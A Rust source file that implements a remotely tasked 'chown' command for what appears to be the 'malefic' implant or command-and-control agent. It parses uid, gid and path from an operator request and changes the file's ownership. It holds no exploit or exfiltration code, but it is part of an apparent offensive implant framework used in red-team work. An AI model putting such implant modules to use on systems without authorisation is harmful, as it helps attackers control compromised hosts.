use crate::prelude::*;

pub struct Chown {}

#[async_trait]
#[module_impl("chown")]
impl Module for Chown {}

#[async_trait]
impl malefic_proto::module::ModuleImpl for Chown {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_proto::module::Input,
        _sender: &mut malefic_proto::module::Output,
    ) -> Result {
        let request = check_request!(receiver, Body::ChownRequest)?;

        // 检查 uid 和 gid 是否存在，并尝试将它们解析为 Uid 和 Gid
        let uid = check_field!(request.uid)?.parse::<u32>()?;
        let gid = check_field!(request.gid)?.parse::<u32>()?;
        let path = check_field!(request.path)?;

        malefic_helper::common::filesys::chown(&path, uid, gid)?;

        Ok(TaskResult::new(id))
    }
}
